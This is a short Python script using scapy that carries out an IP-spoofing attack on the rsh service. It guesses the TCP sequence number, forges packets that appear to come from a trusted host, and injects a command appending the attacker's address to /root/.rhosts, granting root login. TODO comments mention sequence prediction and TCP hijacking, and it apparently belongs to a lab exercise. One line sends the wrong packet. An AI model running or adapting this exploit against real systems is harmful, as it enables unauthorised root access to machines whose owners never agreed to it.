from scapy.all import *

import sys
import random

if __name__ == "__main__":
    conf.verb = 0
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])
    pump = "\0root\0root\0echo '%s root' >> /root/.rhosts\0" % my_ip

    dist = 64000
    s    = 69420
    sport = random.randint(512,1023)
    packet = IP(dst = target_ip)/TCP(sport = sport, dport = 514, seq = s, flags ="S")
    response = sr1(packet, timeout = 1)
    if response:
        a = response[TCP].seq + dist + 1
        print(a)
        print(response.show())
        print("reset1")
        R_pack = IP(dst = target_ip)/TCP(sport = sport, dport = 514, flags ="R")
        send(packet)


        spoof = IP(src = trusted_host_ip, dst = target_ip)/TCP(sport = sport, dport = 514, seq = s, flags ="S")
        response = sr1(spoof, timeout =1)
        s += 1

        A_pack = IP(src = trusted_host_ip, dst = target_ip)/TCP(sport = sport, dport = 514, seq = s, ack = a, flags ="A")
        response = sr1(A_pack, timeout =1)

        PA_pack = IP(src = trusted_host_ip, dst = target_ip)/TCP(sport = sport, dport = 514, seq = s, ack = a, flags ="PA")/pump
        response = sr1(PA_pack, timeout =1)
        print("reset2")
        send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sport, dport=514, flags="R"))
    else:
        print("aw")
        quit()
    #TODO: figure out SYN sequence number pattern


    #TODO: TCP hijacking with predicted sequence number
